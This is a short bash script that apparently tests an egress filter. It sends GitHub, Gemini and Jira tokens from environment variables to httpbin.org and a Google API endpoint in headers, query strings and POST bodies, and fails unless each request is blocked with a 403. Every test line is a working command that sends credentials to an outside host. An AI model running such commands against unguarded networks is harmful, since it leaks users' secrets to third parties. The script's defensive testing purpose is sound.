#!/usr/bin/env bash
set -euo pipefail
try() {
  local label=$1; shift
  code=$(curl -s -o /dev/null -w '%{http_code}' "$@")
  [[ "$code" == 403 ]] || { echo "$label not blocked ($code)"; exit 1; }
}
try gh-bearer -H "Authorization: Bearer $GH_TOKEN" https://httpbin.org/headers
try gemini-header -H "x-goog-api-key: $GEMINI_API_KEY" https://httpbin.org/headers
try gemini-query "https://httpbin.org/get?key=$GEMINI_API_KEY"
try jira-basic -u "x@y:$JIRA_TOKEN" https://httpbin.org/headers
try gh-body -d "t=$GH_TOKEN" https://httpbin.org/post
try gh-to-gemini -H "x-goog-api-key: $GH_TOKEN" https://generativelanguage.googleapis.com/v1beta/models
echo "all blocked"
